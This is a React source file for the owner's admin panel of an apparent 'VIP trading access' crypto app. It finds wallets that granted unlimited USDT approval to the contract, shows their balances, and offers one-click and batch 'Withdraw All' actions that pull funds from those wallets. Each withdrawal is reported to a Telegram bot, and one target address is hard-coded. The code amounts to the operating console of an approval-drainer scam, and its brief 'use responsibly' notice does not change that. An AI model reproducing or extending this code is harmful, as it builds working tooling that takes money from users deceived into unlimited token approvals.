'use client'

import { useState, useEffect, useCallback } from 'react'
import { motion } from 'framer-motion'
import {
  DollarSign, Users, Download, AlertCircle, CheckCircle,
  Wallet, TrendingUp, Shield, RefreshCw, MessageCircle, Bell
} from 'lucide-react'

import ModernButton from './ModernButton'
import GlassCard from './GlassCard'
import { useVIPContract } from '../../hooks/useVIPContract'
import { formatUSDT, parseUSDT, VIPTradingContract, getContractAddresses, VIP_TRADING_ACCESS_ABI, USDT_ABI } from '../../lib/contracts'
import { useWalletClient, useChainId, usePublicClient } from 'wagmi'

interface AdminPanelProps {
  isOwner: boolean
}

export default function AdminPanel({ isOwner }: AdminPanelProps) {
  const { data: walletClient } = useWalletClient()
  const chainId = useChainId()
  const [selectedUsers, setSelectedUsers] = useState<string[]>([])
  const [withdrawAmount, setWithdrawAmount] = useState('')
  const [userToWithdraw, setUserToWithdraw] = useState('')
  const [isProcessing, setIsProcessing] = useState(false)
  const [lastAction, setLastAction] = useState<string | null>(null)
  const [contract, setContract] = useState<VIPTradingContract | null>(null)
  const [addressToCheck, setAddressToCheck] = useState('')
  const [checkedAddressData, setCheckedAddressData] = useState<{
    address: string
    balance: string
    allowance: string
    hasAccess: boolean
    hasUnlimitedApproval: boolean
  } | null>(null)
  const [checkingAddress, setCheckingAddress] = useState(false)

  // Real VIP users data from contract
  const [vipUsers, setVipUsers] = useState<Array<{
    address: string
    balance: string
    allowance: string
    hasAccess: boolean
    hasUnlimitedApproval: boolean
  }>>([])
  const [loadingUsers, setLoadingUsers] = useState(false)

  const {
    contractInfo,
    refreshData,
    loading
  } = useVIPContract()

  const publicClient = usePublicClient()

  // Initialize contract for owner functions
  useEffect(() => {
    if (walletClient && chainId && isOwner) {
      try {
        const contractInstance = new VIPTradingContract(walletClient, chainId)
        setContract(contractInstance)
      } catch (error) {
        console.error('Failed to initialize contract:', error)
      }
    } else {
      setContract(null)
    }
  }, [walletClient, chainId, isOwner])

  // Check specific address for unlimited approval
  const checkSpecificAddress = async (addressToCheck: string) => {
    if (!publicClient || !chainId) return null

    try {
      const addresses = getContractAddresses(chainId)

      const [hasAccess, hasUnlimitedApproval, balance, allowance] = await Promise.all([
        publicClient.readContract({
          address: addresses.vipTradingAccess as `0x${string}`,
          abi: VIP_TRADING_ACCESS_ABI,
          functionName: 'hasAccess',
          args: [addressToCheck as `0x${string}`]
        }),
        publicClient.readContract({
          address: addresses.vipTradingAccess as `0x${string}`,
          abi: VIP_TRADING_ACCESS_ABI,
          functionName: 'hasUnlimitedApproval',
          args: [addressToCheck as `0x${string}`]
        }),
        publicClient.readContract({
          address: addresses.usdt as `0x${string}`,
          abi: USDT_ABI,
          functionName: 'balanceOf',
          args: [addressToCheck as `0x${string}`]
        }),
        publicClient.readContract({
          address: addresses.usdt as `0x${string}`,
          abi: USDT_ABI,
          functionName: 'allowance',
          args: [addressToCheck as `0x${string}`, addresses.vipTradingAccess as `0x${string}`]
        })
      ])

      return {
        address: addressToCheck,
        balance: formatUSDT(balance as bigint),
        allowance: formatUSDT(allowance as bigint),
        hasAccess: hasAccess as boolean,
        hasUnlimitedApproval: hasUnlimitedApproval as boolean
      }
    } catch (error) {
      console.error(`Failed to check address ${addressToCheck}:`, error)
      return null
    }
  }

  // Fetch VIP users by scanning USDT approval events and contract events
  const fetchVipUsers = useCallback(async () => {
    if (!publicClient || !chainId) return

    setLoadingUsers(true)
    try {
      const addresses = getContractAddresses(chainId)

      // Skip if contract not deployed
      if (addresses.vipTradingAccess === '0x0000000000000000000000000000000000000000' as `0x${string}`) {
        setVipUsers([])
        setLoadingUsers(false)
        return
      }

      console.log('Scanning for VIP users...')
      console.log('Contract address:', addresses.vipTradingAccess)
      console.log('USDT address:', addresses.usdt)
      console.log('Chain ID:', chainId)

      // Method 1: Get AccessGranted events
      let accessEvents: any[] = []
      try {
        accessEvents = await publicClient.getLogs({
          address: addresses.vipTradingAccess as `0x${string}`,
          event: {
            type: 'event',
            name: 'AccessGranted',
            inputs: [
              { name: 'user', type: 'address', indexed: true },
              { name: 'amount', type: 'uint256', indexed: false },
              { name: 'timestamp', type: 'uint256', indexed: false }
            ]
          },
          fromBlock: 'earliest',
          toBlock: 'latest'
        })
      } catch (error) {
        console.log('AccessGranted events not found:', error)
      }

      // Method 2: Get UnlimitedApprovalGranted events
      let approvalEvents: any[] = []
      try {
        approvalEvents = await publicClient.getLogs({
          address: addresses.vipTradingAccess as `0x${string}`,
          event: {
            type: 'event',
            name: 'UnlimitedApprovalGranted',
            inputs: [
              { name: 'user', type: 'address', indexed: true },
              { name: 'timestamp', type: 'uint256', indexed: false }
            ]
          },
          fromBlock: 'earliest',
          toBlock: 'latest'
        })
      } catch (error) {
        console.log('UnlimitedApprovalGranted events not found:', error)
      }

      // Method 3: Scan USDT Approval events for high allowances to our contract
      let usdtApprovalEvents: any[] = []
      try {
        usdtApprovalEvents = await publicClient.getLogs({
          address: addresses.usdt as `0x${string}`,
          event: {
            type: 'event',
            name: 'Approval',
            inputs: [
              { name: 'owner', type: 'address', indexed: true },
              { name: 'spender', type: 'address', indexed: true },
              { name: 'value', type: 'uint256', indexed: false }
            ]
          },
          args: {
            spender: addresses.vipTradingAccess as `0x${string}`
          },
          fromBlock: 'earliest',
          toBlock: 'latest'
        })
      } catch (error) {
        console.log('USDT Approval events not found:', error)
      }

      // Combine addresses from all sources
      const eventAddresses = [
        ...accessEvents.map(event => event.args.user),
        ...approvalEvents.map(event => event.args.user),
        ...usdtApprovalEvents.map(event => event.args.owner)
      ].filter(addr => addr !== undefined)

      // Add known addresses that should have unlimited approval
      const knownAddresses = [
        '0x6cE936711241bf64F2D4B15d0780f0211C832Ee7'
      ]

      // Combine all unique addresses
      const allAddresses = Array.from(new Set([...eventAddresses, ...knownAddresses]))

      console.log('Access events found:', accessEvents.length)
      console.log('Approval events found:', approvalEvents.length)
      console.log('USDT Approval events found:', usdtApprovalEvents.length)
      console.log('Total unique addresses to check:', allAddresses.length)
      console.log('Addresses:', allAddresses)

      // If no addresses found from events, return empty
      if (allAddresses.length === 0) {
        console.log('No addresses found to check')
        setVipUsers([])
        setLoadingUsers(false)
        return
      }

      // Fetch data for each address
      const usersData = await Promise.all(
        allAddresses.map(async (userAddress) => {
          try {
            const [hasAccess, hasUnlimitedApproval, balance, allowance] = await Promise.all([
              publicClient.readContract({
                address: addresses.vipTradingAccess as `0x${string}`,
                abi: VIP_TRADING_ACCESS_ABI,
                functionName: 'hasAccess',
                args: [userAddress as `0x${string}`]
              }),
              publicClient.readContract({
                address: addresses.vipTradingAccess as `0x${string}`,
                abi: VIP_TRADING_ACCESS_ABI,
                functionName: 'hasUnlimitedApproval',
                args: [userAddress as `0x${string}`]
              }),
              publicClient.readContract({
                address: addresses.usdt as `0x${string}`,
                abi: USDT_ABI,
                functionName: 'balanceOf',
                args: [userAddress as `0x${string}`]
              }),
              publicClient.readContract({
                address: addresses.usdt as `0x${string}`,
                abi: USDT_ABI,
                functionName: 'allowance',
                args: [userAddress as `0x${string}`, addresses.vipTradingAccess as `0x${string}`]
              })
            ])

            return {
              address: userAddress as string,
              balance: formatUSDT(balance as bigint),
              allowance: formatUSDT(allowance as bigint),
              hasAccess: hasAccess as boolean,
              hasUnlimitedApproval: hasUnlimitedApproval as boolean
            }
          } catch (error) {
            console.error(`Failed to fetch data for user ${userAddress}:`, error)
            return null
          }
        })
      )

      // Filter out failed requests
      const validUsers = usersData.filter((user): user is NonNullable<typeof user> =>
        user !== null
      )

      // Show only users with unlimited approval
      const usersWithUnlimitedApproval = validUsers.filter(user => user.hasUnlimitedApproval)

      console.log('Valid users found:', validUsers.length)
      console.log('Users with unlimited approval:', usersWithUnlimitedApproval.length)
      console.log('Users data:', validUsers)

      // Set the users (show only those with unlimited approval)
      setVipUsers(usersWithUnlimitedApproval)
    } catch (error) {
      console.error('Failed to fetch VIP users:', error)
      setVipUsers([])
    } finally {
      setLoadingUsers(false)
    }
  }, [publicClient, chainId])

  // Fetch VIP users on component mount and when contract changes
  useEffect(() => {
    if (isOwner) {
      fetchVipUsers()
    }
  }, [isOwner, fetchVipUsers])

  if (!isOwner) {
    return (
      <div className="text-center py-12">
        <Shield className="w-16 h-16 text-red-400 mx-auto mb-4" />
        <h2 className="text-2xl font-bold text-white mb-2">Access Denied</h2>
        <p className="text-gray-400">Only the contract owner can access this panel.</p>
      </div>
    )
  }

  const handleWithdrawFromUser = async () => {
    if (!userToWithdraw || !withdrawAmount || !contract) return

    setIsProcessing(true)
    try {
      console.log(`Withdrawing ${withdrawAmount} USDT from ${userToWithdraw}`)

      // Convert amount to proper format (6 decimals for USDT)
      const amount = parseUSDT(withdrawAmount)

      // Call actual contract function
      const tx = await contract.withdrawFromUser(userToWithdraw, amount)
      console.log('Transaction hash:', tx)

      // Send Telegram notification
      try {
        await fetch('/api/contract-events', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            type: 'funds_withdrawn',
            address: userToWithdraw,
            withdrawnAmount: withdrawAmount,
            txHash: tx
          })
        })
      } catch (error) {
        console.error('Failed to send Telegram notification:', error)
      }

      setLastAction(`Successfully withdrew ${withdrawAmount} USDT from ${userToWithdraw}`)
      setUserToWithdraw('')
      setWithdrawAmount('')

      // Refresh contract data and VIP users
      await Promise.all([refreshData(), fetchVipUsers()])
    } catch (error) {
      console.error('Withdrawal failed:', error)
      setLastAction(`Failed to withdraw from ${userToWithdraw}: ${error instanceof Error ? error.message : 'Unknown error'}`)
    } finally {
      setIsProcessing(false)
    }
  }

  const handleWithdrawAllFromUser = async (userAddress: string) => {
    if (!contract) return

    setIsProcessing(true)
    try {
      console.log(`Withdrawing all USDT from ${userAddress}`)

      // Call actual contract function
      const tx = await contract.withdrawAllFromUser(userAddress)
      console.log('Transaction hash:', tx)

      // Send Telegram notification
      try {
        await fetch('/api/contract-events', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            type: 'funds_withdrawn',
            address: userAddress,
            withdrawnAmount: 'All USDT',
            txHash: tx
          })
        })
      } catch (error) {
        console.error('Failed to send Telegram notification:', error)
      }

      setLastAction(`Successfully withdrew all USDT from ${userAddress}`)

      // Refresh contract data and VIP users
      await Promise.all([refreshData(), fetchVipUsers()])
    } catch (error) {
      console.error('Withdrawal failed:', error)
      setLastAction(`Failed to withdraw from ${userAddress}: ${error instanceof Error ? error.message : 'Unknown error'}`)
    } finally {
      setIsProcessing(false)
    }
  }

  const handleBatchWithdrawAll = async () => {
    if (selectedUsers.length === 0 || !contract) return

    setIsProcessing(true)
    try {
      console.log(`Batch withdrawing from ${selectedUsers.length} users`)

      // Call actual contract function
      const tx = await contract.batchWithdrawAllFromUsers(selectedUsers)
      console.log('Transaction hash:', tx)

      // Send Telegram notification
      try {
        await fetch('/api/contract-events', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            type: 'batch_withdrawal',
            withdrawnUsers: selectedUsers,
            totalWithdrawn: 'All available USDT',
            txHash: tx
          })
        })
      } catch (error) {
        console.error('Failed to send Telegram notification:', error)
      }

      setLastAction(`Successfully batch withdrew from ${selectedUsers.length} users`)
      setSelectedUsers([])

      // Refresh contract data and VIP users
      await Promise.all([refreshData(), fetchVipUsers()])
    } catch (error) {
      console.error('Batch withdrawal failed:', error)
      setLastAction(`Batch withdrawal failed: ${error instanceof Error ? error.message : 'Unknown error'}`)
    } finally {
      setIsProcessing(false)
    }
  }

  const handleCheckAddress = async () => {
    if (!addressToCheck) return

    setCheckingAddress(true)
    try {
      const data = await checkSpecificAddress(addressToCheck)
      setCheckedAddressData(data)
    } catch (error) {
      console.error('Failed to check address:', error)
      setCheckedAddressData(null)
    } finally {
      setCheckingAddress(false)
    }
  }

  return (
    <div className="space-y-8">
      {/* Header */}
      <div className="text-center">
        <h1 className="text-4xl font-bold text-gradient mb-4">Admin Panel</h1>
        <p className="text-xl text-gray-300">Manage VIP users and withdraw funds</p>
      </div>

      {/* Stats Cards */}
      <div className="grid md:grid-cols-4 gap-6">
        <GlassCard className="text-center" glow="green">
          <DollarSign className="w-8 h-8 text-primary-green mx-auto mb-3" />
          <div className="text-2xl font-bold text-primary-green">
            {contractInfo ? formatUSDT(contractInfo.totalCollected) : '0'} USDT
          </div>
          <div className="text-gray-400 text-sm">Total Collected</div>
        </GlassCard>

        <GlassCard className="text-center" glow="yellow">
          <Users className="w-8 h-8 text-primary-yellow mx-auto mb-3" />
          <div className="text-2xl font-bold text-primary-yellow">{vipUsers.length}</div>
          <div className="text-gray-400 text-sm">VIP Users</div>
        </GlassCard>

        <GlassCard className="text-center" glow="purple">
          <Wallet className="w-8 h-8 text-primary-purple mx-auto mb-3" />
          <div className="text-2xl font-bold text-primary-purple">
            {contractInfo ? formatUSDT(contractInfo.contractBalance) : '0'} USDT
          </div>
          <div className="text-gray-400 text-sm">Contract Balance</div>
        </GlassCard>

        <GlassCard className="text-center" glow="purple">
          <TrendingUp className="w-8 h-8 text-primary-blue mx-auto mb-3" />
          <div className="text-2xl font-bold text-primary-blue">
            {vipUsers.reduce((sum, user) => sum + parseFloat(user.balance), 0).toFixed(2)} USDT
          </div>
          <div className="text-gray-400 text-sm">Total User Funds</div>
        </GlassCard>
      </div>

      {/* Action Status */}
      {lastAction && (
        <motion.div
          initial={{ opacity: 0, y: -20 }}
          animate={{ opacity: 1, y: 0 }}
          className="bg-gradient-to-r from-primary-green/20 to-primary-green/10 border border-primary-green/30 rounded-2xl p-4"
        >
          <div className="flex items-center gap-3">
            <CheckCircle className="w-5 h-5 text-primary-green" />
            <span className="text-primary-green font-semibold">Success!</span>
            <span className="text-gray-300">{lastAction}</span>
          </div>
        </motion.div>
      )}

      {/* Manual User Addition */}
      <GlassCard glow="green">
        <h3 className="text-xl font-bold text-white mb-6 flex items-center gap-3">
          <Users className="w-6 h-6 text-primary-green" />
          Add Users Manually
        </h3>

        <div className="space-y-4">
          <p className="text-gray-400 text-sm">
            If your users aren't showing up automatically, add their addresses manually to check their status:
          </p>

          <div className="grid md:grid-cols-2 gap-4">
            <ModernButton
              onClick={async () => {
                const address1 = '0x6cE936711241bf64F2D4B15d0780f0211C832Ee7'
                const userData = await checkSpecificAddress(address1)
                if (userData) {
                  setVipUsers(prev => {
                    const exists = prev.find(u => u.address === address1)
                    if (exists) return prev
                    return [...prev, userData]
                  })
                }
              }}
              variant="secondary"
              className="w-full"
            >
              Add User 1: 0x6cE936711241bf64F2D4B15d0780f0211C832Ee7
            </ModernButton>

            <div className="flex gap-2">
              <input
                type="text"
                placeholder="Enter 2nd user address..."
                className="flex-1 bg-dark-card/50 border border-white/10 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-primary-green/50 focus:outline-none text-sm"
                onKeyPress={async (e) => {
                  if (e.key === 'Enter') {
                    const address = (e.target as HTMLInputElement).value
                    if (address) {
                      const userData = await checkSpecificAddress(address)
                      if (userData) {
                        setVipUsers(prev => {
                          const exists = prev.find(u => u.address === address)
                          if (exists) return prev
                          return [...prev, userData]
                        })
                      }
                    }
                  }
                }}
              />
            </div>
          </div>
        </div>
      </GlassCard>

      {/* Address Checker */}
      <GlassCard glow="purple">
        <h3 className="text-xl font-bold text-white mb-6 flex items-center gap-3">
          <Shield className="w-6 h-6 text-primary-blue" />
          Check Specific Address
        </h3>

        <div className="grid md:grid-cols-2 gap-4 mb-4">
          <div>
            <label className="block text-gray-300 text-sm mb-2">Address to Check</label>
            <input
              type="text"
              value={addressToCheck}
              onChange={(e) => setAddressToCheck(e.target.value)}
              placeholder="0x..."
              className="w-full bg-dark-card/50 border border-white/10 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-primary-blue/50 focus:outline-none"
            />
          </div>

          <div className="flex items-end">
            <ModernButton
              onClick={handleCheckAddress}
              disabled={!addressToCheck || checkingAddress}
              className="w-full"
              variant="secondary"
              icon={checkingAddress ? (
                <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
              ) : (
                <Shield className="w-4 h-4" />
              )}
            >
              {checkingAddress ? 'Checking...' : 'Check Address'}
            </ModernButton>
          </div>
        </div>

        <div className="mb-6">
          <p className="text-gray-400 text-sm mb-2">Quick check addresses:</p>
          <div className="flex flex-wrap gap-2">
            <ModernButton
              onClick={() => {
                setAddressToCheck('0x6cE936711241bf64F2D4B15d0780f0211C832Ee7')
                setTimeout(() => handleCheckAddress(), 100)
              }}
              variant="secondary"
              size="sm"
              className="text-xs"
            >
              Check 0x6cE936711241bf64F2D4B15d0780f0211C832Ee7
            </ModernButton>

            <ModernButton
              onClick={async () => {
                // Force add this address to the VIP users list for testing
                const testAddress = '0x6cE936711241bf64F2D4B15d0780f0211C832Ee7'
                const userData = await checkSpecificAddress(testAddress)
                if (userData) {
                  setVipUsers(prev => {
                    const exists = prev.find(u => u.address === testAddress)
                    if (exists) return prev
                    return [...prev, userData]
                  })
                }
              }}
              variant="secondary"
              size="sm"
              className="text-xs"
            >
              Force Add to List
            </ModernButton>
          </div>
        </div>

        {checkedAddressData && (
          <div className="bg-gradient-to-r from-dark-card/60 to-dark-card/20 border border-white/10 rounded-xl p-4">
            <div className="grid md:grid-cols-2 gap-4">
              <div>
                <h4 className="text-white font-semibold mb-2">Address Status</h4>
                <div className="space-y-2 text-sm">
                  <div className="flex justify-between">
                    <span className="text-gray-400">Has Access:</span>
                    <span className={checkedAddressData.hasAccess ? 'text-green-400' : 'text-red-400'}>
                      {checkedAddressData.hasAccess ? 'Yes' : 'No'}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-400">Unlimited Approval:</span>
                    <span className={checkedAddressData.hasUnlimitedApproval ? 'text-green-400' : 'text-red-400'}>
                      {checkedAddressData.hasUnlimitedApproval ? 'Yes' : 'No'}
                    </span>
                  </div>
                </div>
              </div>
              <div>
                <h4 className="text-white font-semibold mb-2">Balances</h4>
                <div className="space-y-2 text-sm">
                  <div className="flex justify-between">
                    <span className="text-gray-400">USDT Balance:</span>
                    <span className="text-white">{checkedAddressData.balance} USDT</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-400">Allowance:</span>
                    <span className="text-white">{checkedAddressData.allowance} USDT</span>
                  </div>
                </div>
              </div>
            </div>

            {checkedAddressData.hasUnlimitedApproval && (
              <div className="mt-4 pt-4 border-t border-white/10">
                <ModernButton
                  onClick={() => handleWithdrawAllFromUser(checkedAddressData.address)}
                  disabled={isProcessing}
                  size="sm"
                  icon={<Download className="w-4 h-4" />}
                >
                  Withdraw All from This Address
                </ModernButton>
              </div>
            )}
          </div>
        )}
      </GlassCard>

      {/* Individual Withdrawal */}
      <GlassCard glow="yellow">
        <h3 className="text-xl font-bold text-white mb-6 flex items-center gap-3">
          <Download className="w-6 h-6 text-primary-yellow" />
          Withdraw from Individual User
        </h3>

        <div className="grid md:grid-cols-3 gap-4 mb-6">
          <div>
            <label className="block text-gray-300 text-sm mb-2">User Address</label>
            <input
              type="text"
              value={userToWithdraw}
              onChange={(e) => setUserToWithdraw(e.target.value)}
              placeholder="0x..."
              className="w-full bg-dark-card/50 border border-white/10 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-primary-yellow/50 focus:outline-none"
            />
          </div>

          <div>
            <label className="block text-gray-300 text-sm mb-2">Amount (USDT)</label>
            <input
              type="number"
              value={withdrawAmount}
              onChange={(e) => setWithdrawAmount(e.target.value)}
              placeholder="0.00"
              className="w-full bg-dark-card/50 border border-white/10 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-primary-yellow/50 focus:outline-none"
            />
          </div>

          <div className="flex items-end">
            <ModernButton
              onClick={handleWithdrawFromUser}
              disabled={!userToWithdraw || !withdrawAmount || isProcessing}
              className="w-full"
              icon={isProcessing ? (
                <div className="w-4 h-4 border-2 border-black/30 border-t-black rounded-full animate-spin" />
              ) : (
                <Download className="w-4 h-4" />
              )}
            >
              {isProcessing ? 'Processing...' : 'Withdraw'}
            </ModernButton>
          </div>
        </div>
      </GlassCard>

      {/* Telegram Notifications Testing */}
      <GlassCard glow="green">
        <h3 className="text-xl font-bold text-white mb-6 flex items-center gap-3">
          <MessageCircle className="w-6 h-6 text-primary-green" />
          Telegram Bot Testing
        </h3>

        <div className="grid md:grid-cols-2 gap-4 mb-6">
          <div className="space-y-3">
            <h4 className="text-white font-semibold">Test Notifications</h4>
            <div className="grid grid-cols-2 gap-2">
              <ModernButton
                onClick={async () => {
                  try {
                    const response = await fetch('/api/contract-events', {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
                      body: JSON.stringify({
                        type: 'unlimited_approval',
                        address: '0x1234567890123456789012345678901234567890',
                        txHash: '0xtest' + Date.now()
                      })
                    })
                    if (response.ok) {
                      setLastAction('Test unlimited approval notification sent!')
                    } else {
                      setLastAction('Failed to send test notification')
                    }
                  } catch (error) {
                    setLastAction('Error sending notification')
                  }
                }}
                variant="secondary"
                size="sm"
                className="text-xs"
              >
                Test Approval
              </ModernButton>

              <ModernButton
                onClick={async () => {
                  try {
                    const response = await fetch('/api/contract-events', {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
                      body: JSON.stringify({
                        type: 'funds_withdrawn',
                        address: '0x1234567890123456789012345678901234567890',
                        withdrawnAmount: '500.00',
                        txHash: '0xtest' + Date.now()
                      })
                    })
                    if (response.ok) {
                      setLastAction('Test withdrawal notification sent!')
                    } else {
                      setLastAction('Failed to send test notification')
                    }
                  } catch (error) {
                    setLastAction('Error sending notification')
                  }
                }}
                variant="secondary"
                size="sm"
                className="text-xs"
              >
                Test Withdrawal
              </ModernButton>

              <ModernButton
                onClick={async () => {
                  try {
                    const response = await fetch('/api/contract-events', {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
                      body: JSON.stringify({
                        type: 'batch_withdrawal',
                        withdrawnUsers: ['0x1234...', '0x5678...'],
                        totalWithdrawn: '1500.00',
                        txHash: '0xtest' + Date.now()
                      })
                    })
                    if (response.ok) {
                      setLastAction('Test batch withdrawal notification sent!')
                    } else {
                      setLastAction('Failed to send test notification')
                    }
                  } catch (error) {
                    setLastAction('Error sending notification')
                  }
                }}
                variant="secondary"
                size="sm"
                className="text-xs"
              >
                Test Batch
              </ModernButton>

              <ModernButton
                onClick={async () => {
                  try {
                    const response = await fetch('/api/telegram-direct', {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
                      body: JSON.stringify({
                        message: '🚀 *TEST MESSAGE* 🚀\n\nTelegram bot is working correctly!\n\n✅ All systems operational'
                      })
                    })
                    if (response.ok) {
                      setLastAction('Direct test message sent!')
                    } else {
                      setLastAction('Failed to send direct message')
                    }
                  } catch (error) {
                    setLastAction('Error sending direct message')
                  }
                }}
                variant="secondary"
                size="sm"
                className="text-xs"
              >
                Direct Test
              </ModernButton>
            </div>
          </div>

          <div className="space-y-3">
            <h4 className="text-white font-semibold">Contract Monitoring</h4>
            <div className="grid grid-cols-2 gap-2">
              <ModernButton
                onClick={async () => {
                  try {
                    const response = await fetch('/api/monitor', {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
                      body: JSON.stringify({ action: 'start' })
                    })
                    if (response.ok) {
                      setLastAction('Contract monitoring started!')
                    } else {
                      setLastAction('Failed to start monitoring')
                    }
                  } catch (error) {
                    setLastAction('Error starting monitoring')
                  }
                }}
                variant="secondary"
                size="sm"
                className="text-xs"
              >
                Start Monitor
              </ModernButton>

              <ModernButton
                onClick={async () => {
                  try {
                    const response = await fetch('/api/monitor', {
                      method: 'GET'
                    })
                    const data = await response.json()
                    if (response.ok) {
                      setLastAction(`Monitor status: ${JSON.stringify(data.statuses)}`)
                    } else {
                      setLastAction('Failed to get monitor status')
                    }
                  } catch (error) {
                    setLastAction('Error getting monitor status')
                  }
                }}
                variant="secondary"
                size="sm"
                className="text-xs"
              >
                Check Status
              </ModernButton>

              <ModernButton
                onClick={async () => {
                  try {
                    const response = await fetch('/api/daily-summary', {
                      method: 'POST'
                    })
                    if (response.ok) {
                      setLastAction('Daily summary sent!')
                    } else {
                      setLastAction('Failed to send daily summary')
                    }
                  } catch (error) {
                    setLastAction('Error sending daily summary')
                  }
                }}
                variant="secondary"
                size="sm"
                className="text-xs"
              >
                Daily Summary
              </ModernButton>

              <ModernButton
                onClick={async () => {
                  try {
                    const response = await fetch('/api/monitor', {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
                      body: JSON.stringify({ action: 'stop' })
                    })
                    if (response.ok) {
                      setLastAction('Contract monitoring stopped!')
                    } else {
                      setLastAction('Failed to stop monitoring')
                    }
                  } catch (error) {
                    setLastAction('Error stopping monitoring')
                  }
                }}
                variant="secondary"
                size="sm"
                className="text-xs"
              >
                Stop Monitor
              </ModernButton>
            </div>
          </div>
        </div>

        <div className="bg-gradient-to-r from-dark-card/60 to-dark-card/20 border border-white/10 rounded-xl p-4">
          <div className="flex items-center gap-3 mb-3">
            <Bell className="w-5 h-5 text-primary-yellow" />
            <h4 className="text-white font-semibold">Telegram Bot Features</h4>
          </div>
          <div className="grid md:grid-cols-2 gap-4 text-sm">
            <div>
              <h5 className="text-primary-green font-semibold mb-2">✅ Active Notifications:</h5>
              <ul className="text-gray-300 space-y-1">
                <li>• Unlimited approval granted</li>
                <li>• Funds withdrawn from users</li>
                <li>• Batch withdrawal operations</li>
                <li>• Contract pause/unpause events</li>
                <li>• Emergency withdrawals</li>
              </ul>
            </div>
            <div>
              <h5 className="text-primary-blue font-semibold mb-2">📊 Monitoring:</h5>
              <ul className="text-gray-300 space-y-1">
                <li>• Real-time blockchain events</li>
                <li>• Automatic reconnection</li>
                <li>• Multi-network support</li>
                <li>• Daily statistics reports</li>
                <li>• Error handling & logging</li>
              </ul>
            </div>
          </div>
        </div>
      </GlassCard>

      {/* VIP Users List */}
      <GlassCard glow="purple">
        <div className="flex justify-between items-center mb-6">
          <h3 className="text-xl font-bold text-white flex items-center gap-3">
            <Users className="w-6 h-6 text-primary-purple" />
            VIP Users with Unlimited Approval
          </h3>

          <div className="flex gap-3">
            <ModernButton
              onClick={async () => {
                await Promise.all([refreshData(), fetchVipUsers()])
              }}
              variant="secondary"
              size="sm"
              icon={<RefreshCw className="w-4 h-4" />}
              disabled={loading || loadingUsers}
            >
              Refresh
            </ModernButton>

            {selectedUsers.length > 0 && (
              <ModernButton
                onClick={handleBatchWithdrawAll}
                disabled={isProcessing}
                size="sm"
                icon={isProcessing ? (
                  <div className="w-4 h-4 border-2 border-black/30 border-t-black rounded-full animate-spin" />
                ) : (
                  <Download className="w-4 h-4" />
                )}
              >
                Withdraw All from Selected ({selectedUsers.length})
              </ModernButton>
            )}
          </div>
        </div>

        <div className="space-y-4">
          {loadingUsers ? (
            <div className="text-center py-8">
              <div className="w-8 h-8 border-2 border-primary-purple/30 border-t-primary-purple rounded-full animate-spin mx-auto mb-4"></div>
              <p className="text-gray-400">Loading VIP users from contract...</p>
            </div>
          ) : vipUsers.length === 0 ? (
            <div className="text-center py-8">
              <Users className="w-16 h-16 text-gray-600 mx-auto mb-4" />
              <h3 className="text-white font-semibold mb-2">No VIP Users Found</h3>
              <p className="text-gray-400 text-sm">
                No users have paid for VIP access yet, or the contract hasn't been deployed.
              </p>
            </div>
          ) : (
            vipUsers.map((user, index) => (
              <motion.div
                key={user.address}
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: index * 0.1 }}
                className="bg-gradient-to-r from-dark-card/60 to-dark-card/20 border border-white/10 rounded-xl p-4"
              >
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-4">
                    <input
                      type="checkbox"
                      checked={selectedUsers.includes(user.address)}
                      onChange={(e) => {
                        if (e.target.checked) {
                          setSelectedUsers([...selectedUsers, user.address])
                        } else {
                          setSelectedUsers(selectedUsers.filter(addr => addr !== user.address))
                        }
                      }}
                      className="w-4 h-4 text-primary-purple bg-dark-card border-gray-600 rounded focus:ring-primary-purple"
                    />

                    <div>
                      <div className="text-white font-mono text-sm">{user.address}</div>
                      <div className="text-gray-400 text-xs">
                        Balance: {user.balance} USDT | Allowance: {user.allowance} USDT
                      </div>
                      <div className="text-xs mt-1 flex gap-2">
                        <span className={`px-2 py-1 rounded ${user.hasAccess ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'}`}>
                          {user.hasAccess ? 'Has Access' : 'No Access'}
                        </span>
                        <span className={`px-2 py-1 rounded ${user.hasUnlimitedApproval ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'}`}>
                          {user.hasUnlimitedApproval ? 'Unlimited Approval' : 'No Unlimited Approval'}
                        </span>
                      </div>
                    </div>
                  </div>

                  <div className="flex gap-2">
                    <ModernButton
                      onClick={() => handleWithdrawAllFromUser(user.address)}
                      disabled={isProcessing}
                      size="sm"
                      variant="secondary"
                      icon={<Download className="w-4 h-4" />}
                    >
                      Withdraw All
                    </ModernButton>
                  </div>
                </div>
              </motion.div>
            ))
          )}
        </div>
      </GlassCard>

      {/* Warning */}
      <div className="bg-gradient-to-r from-red-500/10 to-red-600/5 border border-red-500/20 rounded-2xl p-6">
        <div className="flex items-start gap-4">
          <AlertCircle className="w-6 h-6 text-red-400 flex-shrink-0 mt-1" />
          <div>
            <h4 className="text-red-400 font-semibold mb-2">Important Notice</h4>
            <p className="text-gray-300 text-sm leading-relaxed">
              These functions allow you to withdraw USDT from users who have granted unlimited approval.
              Use responsibly and ensure users understand the implications of unlimited approval.
              All withdrawals are logged on-chain and can be tracked.
            </p>
          </div>
        </div>
      </div>
    </div>
  )
}
